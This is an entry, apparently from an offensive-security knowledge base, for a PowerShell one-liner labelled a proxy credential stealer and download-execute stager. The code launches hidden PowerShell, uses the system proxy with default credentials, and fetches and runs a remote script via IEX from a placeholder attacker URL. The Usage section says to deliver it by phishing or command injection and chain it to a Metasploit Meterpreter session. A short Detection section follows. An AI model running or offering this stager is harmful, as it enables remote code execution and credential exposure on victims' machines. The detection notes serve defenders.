---
id: ff9b1bd7-dca1-4e80-879e-7362722a4cab
name: PowerShell-Proxy-Credential-Stealer-and-Download-Execute
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:21.342189+00:00'
updated_at: '2023-04-10T20:25:00.365273+00:00'
platforms:
  - Windows
tags:
  - powershell
  - credential-theft
  - execution
  - proxy
validated: true
---

# PowerShell-Proxy-Credential-Stealer-and-Download-Execute

## Code

```powershell
powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');
```

## Description

This PowerShell one-liner launches a hidden process that configures a web client to authenticate through the system's proxy using stored default credentials, downloads a remote script, and executes it inline via IEX. It facilitates payload delivery in proxied environments while potentially exposing proxy credentials to the remote server during the request.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| http://10.0.0.1:8080/rYDPPB | URL of the remote script/stager to download and execute | http://attacker-ip:8080/randomid |

## Usage

Deliver this command to a Windows target via phishing or command injection. It requires the target to have proxy settings configured with credentials. Use in conjunction with a web_delivery listener to chain into Meterpreter session establishment. Substitute the URL with the stager from Metasploit.

## Detection

- Enable PowerShell Script Block Logging to capture IEX invocations and downloadstring calls.
- Proxy server logs for unusual auth attempts from internal clients to external URLs.
- EDR alerts on hidden PowerShell processes creating web clients or network connections to suspicious IPs.

## Related

- [[procedures/Deliver-Meterpreter-Payload-via-Web-Delivery-and-Steal-Proxy-Credentials]]
- [[tools/Metasploit]]
